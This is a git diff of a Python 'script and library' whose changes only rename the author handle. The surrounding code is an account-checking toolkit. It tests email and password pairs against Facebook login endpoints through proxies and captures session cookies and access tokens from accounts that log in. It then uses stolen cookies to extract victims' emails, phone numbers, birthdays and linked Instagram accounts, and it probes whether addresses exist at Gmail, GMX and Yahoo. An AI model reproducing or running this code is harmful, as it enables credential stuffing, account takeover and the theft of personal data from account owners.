@@ -1,5 +1,5 @@
-# The Script And The Library For Odai @K33Ka
-# السكربت و المكتبة لعدي @K33Ka
+# The Script And The Library For Odai @K33K1
+# السكربت و المكتبة لعدي @K33K1
 import requests
 import httpx
 import random
@@ -160,12 +160,12 @@ class facebook:
             account_id = re.search(r'ACCOUNT_ID["\']?\s*[:=]\s*["\']?(\d+)', response)
             user_id = re.search(r'USER_ID["\']?\s*[:=]\s*["\']?(\d+)', response)
             username = re.search(r'USERNAME["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_.]+)', response)
-            if (account_id and account_id.group(1) != "0" and user_id and user_id.group(1) != "0" and username and username.group(1) != "0"):return {"status": "success","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif ('Please complete the security check to log in.' in response or 'two_step_verification' in response or '2fa' in response.lower()):return {"status": "checkpoint","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif ('كلمة السر التي أدخلتها غير صحيحة.' in response or 'هل نسيت كلمة السر؟' in response):return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif 'البريد الإلكتروني أو رقم الهاتف المحمول الذي أدخلته غير مرتبط بحساب.' in response:return {"status": "user not found","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
-            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
-        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
+            if (account_id and account_id.group(1) != "0" and user_id and user_id.group(1) != "0" and username and username.group(1) != "0"):return {"status": "success","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif ('Please complete the security check to log in.' in response or 'two_step_verification' in response or '2fa' in response.lower()):return {"status": "checkpoint","account_id": account_id.group(1),"username": username.group(1),"user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif ('كلمة السر التي أدخلتها غير صحيحة.' in response or 'هل نسيت كلمة السر؟' in response):return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif 'البريد الإلكتروني أو رقم الهاتف المحمول الذي أدخلته غير مرتبط بحساب.' in response:return {"status": "user not found","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
+            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
+        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
     @staticmethod
     def auth(email, password, proxies=None):
         data = {"locale": "en_GB","format": "json","user": email,"password": password,"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies": 1}
@@ -177,10 +177,10 @@ class facebook:
             if 'access_token' in result or 'session_key' in result:
                 uid = result.get('uid', '')
                 cookies = ';'.join(i['name'] + '=' + i['value'] for i in result.get('session_cookies', []))
-                return {"status": "success","uid": uid,"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif ('www.facebook.com' in result.get('error', {}).get('message', '') or 'Please complete the security check to log in.' in text or 'two_step_verification' in text):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33Ka"}
-            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
-        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
+                return {"status": "success","uid": uid,"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif ('www.facebook.com' in result.get('error', {}).get('message', '') or 'Please complete the security check to log in.' in text or 'two_step_verification' in text):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33K1"}
+            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
+        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
     @staticmethod
     def mobile(email, password, proxies=None):
         payload = {'method': "post", 'pretty': "false", 'format': "json", 'server_timestamps': "true", 'locale': "en_EN", 'purpose': "fetch", 'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request", 'fb_api_caller_class': "graphservice", 'client_doc_id': "11994080425074657009809260413", 'fb_api_client_context': json.dumps({"is_background": False}), 'variables': json.dumps({"params": {"params": json.dumps({"params": json.dumps({"client_input_params": {"sim_phones": [], "aymh_accounts": [{"profiles": {"id": {"is_derived": 0, "credentials": [], "account_center_id": "", "profile_picture_url": "", "small_profile_picture_url": None, "notification_count": 0, "token": "", "last_access_time": 0, "has_smartlock": 0, "credential_type": "none", "password": "", "from_accurate_privacy_result": 0, "dbln_validated": 0, "user_id": "", "name": "", "nta_eligibility_reason": None, "username": "", "account_source": ""}}, "id": ""}], "secure_family_device_id": str(uuid4()), "attestation_result": {}, "has_granted_read_contacts_permissions": 0, "auth_secure_device_id": "null", "has_whatsapp_installed": 1, "password": f"#PWD_FB4A:0:{str(int(time.time()))}:{password}", "sso_token_map_json_string": "", "block_store_machine_id": None, "cloud_trust_token": None, "event_flow": "login_manual", "password_contains_non_ascii": "false", "sim_serials": [], "client_known_key_hash": "", "encrypted_msisdn": "", "has_granted_read_phone_permissions": 0, "app_manager_id": str(uuid4()), "should_show_nested_nta_from_aymh": 1, "device_id": str(uuid4()), "zero_balance_state": "data", "login_attempt_count": 1, "flash_call_permission_status": {"READ_PHONE_STATE": "DENIED", "READ_CALL_LOG": "DENIED", "ANSWER_PHONE_CALLS": "DENIED"}, "accounts_list": [], "family_device_id": str(uuid4()), "fb_ig_device_id": [], "device_emails": [], "try_num": 3, "lois_settings": {"lois_token": ""}, "event_step": "home_page", "headers_infra_flow_id": str(uuid4()), "openid_tokens": {}, "contact_point": email}, "server_params": {"should_trigger_override_login_2fa_action": 0, "is_vanilla_password_page_empty_password": 0, "is_from_logged_out": 0, "should_trigger_override_login_success_action": 0, "login_credential_type": "none", "server_login_source": "login", "waterfall_id": str(uuid4()), "two_step_login_type": "one_step_login", "login_source": "Login", "is_platform_login": 0, "pw_encryption_try_count": 1, "INTERNAL__latency_qpl_marker_id": 36707139, "is_from_aymh": 0, "offline_experiment_group": None, "is_from_landing_page": 0, "password_text_input_id": None, "is_from_empty_password": 0, "is_from_msplit_fallback": 0, "ar_event_source": "login_home_page", "username_text_input_id": None, "layered_homepage_experiment_group": None, "device_id": str(uuid4()), "INTERNAL__latency_qpl_instance_id": 1.06996309100672e14, "reg_flow_source": "login_home_native_integration_point", "is_caa_perf_enabled": 1, "credential_type": "password", "is_from_password_entry_page": 0, "caller": "gslr", "family_device_id": str(uuid4()), "is_from_assistive_id": 0, "access_flow_version": "pre_mt_behavior", "is_from_logged_in_switcher": 0}})}), "bloks_versioning_id": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a", "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"}, "scale": "3", "nt_context": {"using_white_navbar": True, "styles_id": "3b115a54b620c39392b96bdca4c5237f", "pixel_ratio": 3, "is_push_on": True, "debug_tooling_metadata_token": None, "is_flipper_enabled": False, "theme_params": [{"value": [], "design_system_name": "FDS"}], "bloks_version": "c42a4bd8f99cb2bd57ea74ca2b690710be5a50faa60a68bb9bcc524fe6c63e7a"}}), 'fb_api_analytics_tags': json.dumps(["GraphServices"]), 'client_trace_id': "a5bba4f8-b87f-4b73-8d9a-44226255a84c"}
@@ -191,10 +191,10 @@ class facebook:
             if re.search(r'"access_token":"(.*?)"', response_text.replace("/", "").replace("\\", "")):
                 token_match = re.search(r'"access_token":"(.*?)"', response_text.replace("/", "").replace("\\", ""))
                 cookies = extract_cookies(response.text)
-                return {"status": "success","access_token": token_match.group(1),"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif "Invalid username or password" in response_text or 'override_login_2fa_action' in response_text:return {"status": "bad credentials","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
-            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
-        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
+                return {"status": "success","access_token": token_match.group(1),"cookies": cookies,"user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif "Invalid username or password" in response_text or 'override_login_2fa_action' in response_text:return {"status": "bad credentials","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
+            else:return {"status": "unknown response","user": email,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
+        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
     @staticmethod
     def ig_auth(email, password, proxies=None):
         cookies = {'datr': '', 'dpr': '1.25', 'ps_l': '1', 'ps_n': '1', 'sb': '', 'fr': '', 'wd': '834x826'}
@@ -210,10 +210,10 @@ class facebook:
             data = {'jazoest': '22360', 'lsd': lsd, 'email': email, 'pass': password, 'timezone': '-180', 'lgndim': 'eyJ3IjoxNTM2LCJoIjo5NjAsImF3IjoxNTM2LCJhaCI6OTEyLCJjIjozMn0=', 'lgnrnd': '225140_iQTj', 'lgnjs': 'n', 'ab_test_data': '', 'locale': 'en_US', 'shared_prefs_data': '', 'next': 'https://web.facebook.com/ig_xsite_user_info/', 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': ''}
             r = requests.post('https://web.facebook.com/login/device-based/regular/login/', params=params, cookies=cookies, headers=headers, data=data, proxies = Proxy.build(proxies))
             response = r.text
-            if 'The password you’ve entered is incorrect' in response:return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif 'The email you entered isn’t connected to an account' in response:return {"status": "user not found","user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif ('Enter the security code' in response):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33Ka"}
-            elif "Please Confirm Password" in response:return {"status": "correct but typo","user": email,"password": password,"Dev": "Odai @K33Ka"}
+            if 'The password you’ve entered is incorrect' in response:return {"status": "bad password","user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif 'The email you entered isn’t connected to an account' in response:return {"status": "user not found","user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif ('Enter the security code' in response):return {"status": "checkpoint","user": email,"password": password,"Dev": "Odai @K33K1"}
+            elif "Please Confirm Password" in response:return {"status": "correct but typo","user": email,"password": password,"Dev": "Odai @K33K1"}
             env_match = re.search(r'<script id="envjson" type="application/json">(.*?)</script>', response, re.DOTALL)
             account_data = None
             if env_match:
@@ -226,9 +226,9 @@ class facebook:
                     name_match = re.search(r'"NAME"\s*:\s*"([^"]+)"', response)
                     name = name_match.group(1) if name_match else "Unknown"
                     account_data = {"ACCOUNT_ID": account_id, "NAME": name}
-            if account_data and account_data.get("ACCOUNT_ID", "0") not in ("0", "", "null"):return {"status": "success","account_id": account_data.get("ACCOUNT_ID"),"name": account_data.get("NAME", "Unknown"),"cookies": r.cookies.get_dict(),"user": email,"password": password,"Dev": "Odai @K33Ka"}
-            else:return {"status": "unknown response","user": email,"password": password,"Dev": "Odai @K33Ka"}
-        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33Ka"}
+            if account_data and account_data.get("ACCOUNT_ID", "0") not in ("0", "", "null"):return {"status": "success","account_id": account_data.get("ACCOUNT_ID"),"name": account_data.get("NAME", "Unknown"),"cookies": r.cookies.get_dict(),"user": email,"password": password,"Dev": "Odai @K33K1"}
+            else:return {"status": "unknown response","user": email,"password": password,"Dev": "Odai @K33K1"}
+        except Exception as e:return {"status": "error","error": str(e),"user":email,"password": password ,"Dev": "Odai @K33K1"}
     def __init__(self):
         self.session    = requests.Session()
         self.user_agent = (
@@ -457,15 +457,15 @@ class facebook:
         )
         cookies_dict = self.session.cookies.get_dict()
         if 'c_user' in cookies_dict or 'sessionid' in cookies_dict:
-            return {"status": "success","cookies": self.get_full_cookies_string(),"user": username,"password": password,"Dev": "Odai @K33Ka"}
+            return {"status": "success","cookies": self.get_full_cookies_string(),"user": username,"password": password,"Dev": "Odai @K33K1"}
         elif 'two_step_verification.' in response.text:
-            return {"status": "checkpoint","user": username,"password": password,"Dev": "Odai @K33Ka"}
+            return {"status": "checkpoint","user": username,"password": password,"Dev": "Odai @K33K1"}
         elif "Invalid username or password" in response.text or "Incorrect Password" in response.text:
-            return {"status": "wrong credentials","user": username,"password": password,"Dev": "Odai @K33Ka"}
+            return {"status": "wrong credentials","user": username,"password": password,"Dev": "Odai @K33K1"}
         elif 'We can help you log into your account if you' in response.text:
-            return {"status": "user not found","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
+            return {"status": "user not found","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
         else:
-            return {"status": "unknown response","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33Ka"}
+            return {"status": "unknown response","user": username,"password": password,"msg": "check your account info","Dev": "Odai @K33K1"}
     @staticmethod
     def check_email(email: str, proxies=None) -> dict:
         try:
@@ -476,15 +476,15 @@ class facebook:
             except:js = json.loads(r.text)
             total_count = js.get("summary", {}).get("total_count")
             if total_count is not None:
-                if total_count != 0:return {"status": "found", "email": email, "Dev": "Odai @K33Ka"}
-                else:return {"status": "not found", "email": email, "Dev": "Odai @K33Ka"}
-            elif "The action attempted has been deemed abusive or is otherwise disallowed" in r.text:return {"status": "blocked", "email": email, "Dev": "Odai @K33Ka"}
-            else:return {"status": "unknown", "email": email, "raw": js, "Dev": "Odai @K33Ka"}
-        except Exception as e:return {"status": "error", "error": str(e), "email": email, "Dev": "Odai @K33Ka"}
+                if total_count != 0:return {"status": "found", "email": email, "Dev": "Odai @K33K1"}
+                else:return {"status": "not found", "email": email, "Dev": "Odai @K33K1"}
+            elif "The action attempted has been deemed abusive or is otherwise disallowed" in r.text:return {"status": "blocked", "email": email, "Dev": "Odai @K33K1"}
+            else:return {"status": "unknown", "email": email, "raw": js, "Dev": "Odai @K33K1"}
+        except Exception as e:return {"status": "error", "error": str(e), "email": email, "Dev": "Odai @K33K1"}
     class account_info:
         @staticmethod
         def osint(username_or_id_or_link: str, check_other: bool = False, proxies=None) -> dict:
-            Dev = "Odai @K33Ka"
+            Dev = "Odai @K33K1"
             def follow_redirects(url, max_redirects=10):
                 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                 for _ in range(max_redirects):
@@ -586,7 +586,7 @@ class facebook:
             headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'x-fb-lsd': lsd}
             data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'server_timestamps': 'true', 'variables': '{"identity_id":"'+c_user+'","interface":"FB_WEB","platform":"FACEBOOK","scale":1}', 'doc_id': '26102210629377215'}
             response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
-            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33Ka"}
+            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33K1"}
             response = response.replace("for (;;);", "")
             js = json.loads(response)
             result = {"facebook_name": js["data"]["fxim_identity_for_id"]["full_name"],"instagram_accounts": []}
@@ -600,9 +600,9 @@ class facebook:
                         ig_response = ig_response.replace("for (;;);", "")
                         ig_json = json.loads(ig_response)
                         ig_data = ig_json["data"]["fxim_identity_for_id"]
-                        if ig_id and ig_data:result["instagram_accounts"].append({"id": ig_id,"username": ig_data["username"],"full_name": ig_data["full_name"],"profile_picture": ig_data["profile_picture_info"]["profile_picture_url"],"Dev": "Odai @K33Ka"})
-                        else:result = {"status": "false","msg": "No data","Dev": "Odai @K33Ka"}
-                    except Exception as e:result = {"status": " error","error": e,"Dev": "Odai @K33Ka"}
+                        if ig_id and ig_data:result["instagram_accounts"].append({"id": ig_id,"username": ig_data["username"],"full_name": ig_data["full_name"],"profile_picture": ig_data["profile_picture_info"]["profile_picture_url"],"Dev": "Odai @K33K1"})
+                        else:result = {"status": "false","msg": "No data","Dev": "Odai @K33K1"}
+                    except Exception as e:result = {"status": " error","error": e,"Dev": "Odai @K33K1"}
             return result
         @staticmethod
         def contact(cookies_input):
@@ -633,16 +633,16 @@ class facebook:
             headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'x-fb-lsd': lsd}
             data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterPersonalCentralIdentityDialogV2Query', 'server_timestamps': 'true', 'variables': '{"identity_id":"'+c_user+'","interface":"FB_WEB","platform":"FACEBOOK","scale":1}', 'doc_id': '24467941749567966'}
             response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
-            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33Ka"}
+            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33K1"}
             js = json.loads(response.replace("for (;;);",""))
             node = js["data"]["fxcal_settings"]["node"]
             contacts = node["all_contact_points"]
             if contacts: 
-                result = {"emails": [],"phones": [], "Dev": "Odai @K33Ka"}
+                result = {"emails": [],"phones": [], "Dev": "Odai @K33K1"}
                 for c in contacts:
                     if c["contact_point_type"] == "EMAIL":result["emails"].append(c["normalized_contact_point"])
                     if c["contact_point_type"] == "PHONE_NUMBER":result["phones"].append(c["normalized_contact_point"])
-            else:result = {"status": "false","msg": "No data","Dev": "Odai @K33Ka"}
+            else:result = {"status": "false","msg": "No data","Dev": "Odai @K33K1"}
             return result
         @staticmethod
         def birthday(cookies_input):
@@ -673,12 +673,12 @@ class facebook:
             headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,ar;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://accountscenter.facebook.com', 'priority': 'u=1, i', 'referer': 'https://accountscenter.facebook.com/profiles', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"', 'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.160", "Chromium";v="145.0.7632.160"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"19.0.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36', 'x-asbd-id': '359341', 'x-fb-friendly-name': 'FXAccountsCenterBirthdayRootQuery', 'x-fb-lsd': lsd}
             data = {'av': c_user, '__user': c_user, '__a': '1', '__req': 'l', '__hs': '20527.HYP:accounts_center_pkg.2.1...0', 'dpr': '1', '__ccg': 'GOOD', '__rev': '1035205964', '__s': 'txvfss:84i8p9:hr7nlk', '__hsi': '7617460095362994183', '__sjsp': 'gpRi1F1v96gbIfMugGMEY4s0KUgx4aBIEUk0oSbyU1n8', '__comet_req': '5', 'fb_dtsg': fb_dtsg, 'jazoest': '25453', 'lsd': lsd, '__spin_r': '1035205964', '__spin_b': 'trunk', '__spin_t': '1773578137', 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'FXAccountsCenterBirthdayRootQuery', 'server_timestamps': 'true', 'variables': '{"interface":"FB_WEB","node":"BIRTHDAY"}', 'doc_id': '26426848043589913'}
             response = session.post('https://accountscenter.facebook.com/api/graphql/',cookies=cookies,headers=headers,data=data).text
-            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33Ka"}
+            if 'Log in to continue' in response:return {"status": "invaild", "msg": "You Need To Login, Check Your Cookies" , "Dev": "Odai @K33K1"}
             response = response.replace("for (;;);","")
             js = json.loads(response)
             birthday = js["data"]["fxcal_settings"]["node"]["birthday"]
-            if birthday:return {"status": "true","birthday": birthday,"Dev": "Odai @K33Ka"}
-            else:return {"status": "invaild", "msg": "Can't Extract The Birthday, Check Your Cookies or Account" , "Dev": "Odai @K33Ka"}
+            if birthday:return {"status": "true","birthday": birthday,"Dev": "Odai @K33K1"}
+            else:return {"status": "invaild", "msg": "Can't Extract The Birthday, Check Your Cookies or Account" , "Dev": "Odai @K33K1"}
     class tools:
         class apps:
             @staticmethod
@@ -692,7 +692,7 @@ class facebook:
                         if '=' not in part:continue
                         key, val = part.split('=', 1)
                         coki[key.strip()] = val.strip()
-                else:return {"status": "false","msg": "error in cookies format", "Dev": "Odai @K33Ka"}
+                else:return {"status": "false","msg": "error in cookies format", "Dev": "Odai @K33K1"}
                 ua = 'NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Safari/420+'
                 headers = {'user-agent': ua}
                 try:rr1 = session.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=coki, headers=headers, timeout=12).text
@@ -761,10 +761,10 @@ class checkems:
             response = requests.post(url, cookies=cookies, params=params, data=payload, headers=headers, timeout=10, proxies = Proxy.build(proxies), verify=False)
 
             if response.status_code != 200:
-                return {"status": "error", "msg": "bad response step 1", "Dev": "Odai @K33Ka"}
+                return {"status": "error", "msg": "bad response step 1", "Dev": "Odai @K33K1"}
 
             if '",null,"' not in response.text:
-                return {"status": "error", "msg": "failed to extract TL", "Dev": "Odai @K33Ka"}
+                return {"status": "error", "msg": "failed to extract TL", "Dev": "Odai @K33K1"}
 
             TL = str(response.text).split('",null,"')[1].split('"')[0]
             __Host_GAPS = response.cookies.get_dict().get('__Host-GAPS')
@@ -788,10 +788,10 @@ class checkems:
             response = requests.post(url, params=params, cookies=cookies, headers=headers, data=data, timeout=10, proxies = Proxy.build(proxies), verify=False)
             if response.status_code == 200:
                 if '"gf.uar",1' in response.text:
-                    return {"status": "available", "email": email, "Dev": "Odai @K33Ka"}
-                if '"gf.uar",2' in response.text:return {"status": "taken", "email": email, "Dev": "Odai @K33Ka"}
-                else:return {"status": "unknown", "email": email, "Dev": "Odai @K33Ka"}
-            else:return {"status": "error", "msg": "bad response step 2", "Dev": "Odai @K33Ka"}
+                    return {"status": "available", "email": email, "Dev": "Odai @K33K1"}
+                if '"gf.uar",2' in response.text:return {"status": "taken", "email": email, "Dev": "Odai @K33K1"}
+                else:return {"status": "unknown", "email": email, "Dev": "Odai @K33K1"}
+            else:return {"status": "error", "msg": "bad response step 2", "Dev": "Odai @K33K1"}
         except Exception as e:return {"status": "error", "error": str(e)}
     BASE_COOKIES = {'_externalAdId':'1770222114463','ua_id':'019c2975-d6f1-76f1-a57c-d75b785caf41','_originalReferrer':'www.google.com','euconsent-bypass':'1','wa':'opt-out','NGUserID':'TGP-OPT-OUT','utag_main':'_sn:1$_se:8%3Bexp-session$_ss:0%3Bexp-session$_st:1770223941278%3Bexp-session$ses_id:1770222114477%3Bexp-session$_pn:5%3Bexp-session'}
     BASE_HEADERS = {'authority':'signup.gmx.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language':'en-US,en;q=0.9,ar;q=0.8','referer':'https://www.gmx.com/mail/create-email-address/','sec-ch-ua':'"Chromium";v="137", "Not(A:Brand";v="24"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-site','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'}
@@ -820,7 +820,7 @@ class checkems:
         client_guid = config.get('clientCredentialGuid', '')
         if not access_token:return False, None
         headers = {"authority":"register-suggest.gmx.com","accept":"application/json, text/plain, */*","accept-language":"en-US,en;q=0.9,ar;q=0.8","authorization":f"Bearer {access_token}","content-type":"application/vnd.ui.mam.suggestion.creation-v1+json","origin":"https://signup.gmx.com","referer":"https://signup.gmx.com/","sec-ch-ua":'"Chromium";v="137", "Not(A:Brand";v="24"',"sec-ch-ua-mobile":"?1","sec-ch-ua-platform":'"Android"',"sec-fetch-dest":"empty","sec-fetch-mode":"cors","sec-fetch-site":"same-site","user-agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36","x-ccguid":client_guid or cls._generate_guid(),"x-request-id":cls._generate_guid(),"x-ui-app":"@mamdev/umreg.registration-app2/8.37.1"}
-        payload = {"emailAddress":email,"firstName":"Odai","lastName":"K33Ka","birthDate":"2000-05-09","city":"","countryCode":"US","initialRequestedEmailAddress":"","suggestionProducts":["gmxcomFree"],"maxResultCountToProduct":{"gmxcomFree":"4"},"mdhMaxResultCount":"0","requestedEmailAddressProduct":"gmxcomFree"}
+        payload = {"emailAddress":email,"firstName":"Odai","lastName":"K33K1","birthDate":"2000-05-09","city":"","countryCode":"US","initialRequestedEmailAddress":"","suggestionProducts":["gmxcomFree"],"maxResultCountToProduct":{"gmxcomFree":"4"},"mdhMaxResultCount":"0","requestedEmailAddressProduct":"gmxcomFree"}
         try:
             response = requests.post("https://register-suggest.gmx.com/rest/email-alias/availability",json=payload,headers=headers,proxies=proxies,timeout=15)
             if response.status_code == 200:
@@ -905,25 +905,25 @@ class checkems:
                 return {
                     "status": "available",
                     "email": email,
-                    "Dev": "Odai @K33Ka"
+                    "Dev": "Odai @K33K1"
                 }
             
             else:
                 return {
                     "status": "taken",
                    "email": email,
-                    "Dev": "Odai @K33Ka"
+                    "Dev": "Odai @K33K1"
                 }
 
         except Exception as e:
             return {
                 "status": "error",
                 "error": str(e),
-                "Dev": "Odai @K33Ka"
+                "Dev": "Odai @K33K1"
             }
     @staticmethod
     def yahoo(username: str, proxies=None) -> dict:
-        Dev = "Odai @K33Ka"
+        Dev = "Odai @K33K1"
         
         try:
             if "@" in username:username = username.split("@")[0]
@@ -1134,11 +1134,11 @@ class checkems:
             h2={'accept':'application/json, text/plain, */*','content-type':'application/x-www-form-urlencoded','origin':'https://hi2.in','referer':'https://hi2.in/','user-agent':ua}
